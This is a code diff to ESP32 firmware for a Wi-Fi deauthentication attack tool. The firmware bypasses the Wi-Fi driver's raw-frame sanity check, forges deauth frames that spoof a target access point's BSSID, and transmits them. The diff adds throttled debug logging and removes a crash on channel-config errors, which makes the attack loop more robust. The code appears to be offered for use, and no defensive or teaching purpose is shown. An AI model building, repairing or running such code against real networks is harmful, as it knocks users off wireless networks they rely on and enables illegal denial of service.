@@ -2539,6 +2539,7 @@ extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32
 
 // Send raw frame
 void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
+    static unsigned long lastFailLog = 0;
     esp_err_t res = esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
     packet_count++;
     if (res == ESP_OK) {
@@ -2546,17 +2547,34 @@ void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
         consecutive_failures = 0;
     } else {
         consecutive_failures++;
-        //Serial.printf("Deauth packet %d failed: %s, free heap: %u\n", packet_count, esp_err_to_name(res), ESP.getFreeHeap());
+        // Throttle error logging to every 2 seconds to prevent freeze
+        if (millis() - lastFailLog > 2000) {
+            Serial.printf("[DEAUTH] Failures: %d, last: %s, heap: %u\n",
+                consecutive_failures, esp_err_to_name(res), ESP.getFreeHeap());
+            lastFailLog = millis();
+        }
     }
 }
 
 // Send deauthentication frame
 void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record, uint8_t chan) {
-    esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
+    static unsigned long lastDebug = 0;
+
+    esp_err_t ch_err = esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
+
     memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
     memcpy(&deauth_frame[10], ap_record->bssid, 6); // Source: AP BSSID
     memcpy(&deauth_frame[16], ap_record->bssid, 6); // BSSID
     deauth_frame[24] = 7; // Reason code (index 24-25 per frame template)
+
+    // Debug every 2 seconds
+    if (millis() - lastDebug > 2000) {
+        Serial.printf("[DEAUTH] Sending to %02X:%02X:%02X:%02X:%02X:%02X ch=%d ch_err=%d pkts=%lu ok=%lu\n",
+            ap_record->bssid[0], ap_record->bssid[1], ap_record->bssid[2],
+            ap_record->bssid[3], ap_record->bssid[4], ap_record->bssid[5],
+            chan, ch_err, packet_count, success_count);
+        lastDebug = millis();
+    }
 
     wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame));
 }
@@ -3222,8 +3240,10 @@ void deautherLoop() {
                 ap_config.ap.max_connection = 4;
                 ap_config.ap.beacon_interval = 100;
                 ap_config.ap.channel = selectedChannel;
-                ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
-                //Serial.printf("Channel updated to %d\n", selectedChannel);
+                esp_err_t ch_cfg_err = esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+                if (ch_cfg_err != ESP_OK) {
+                    // Config failed, don't crash - just continue on current channel
+                }
             }
         }
         last_channel_check = current_time;
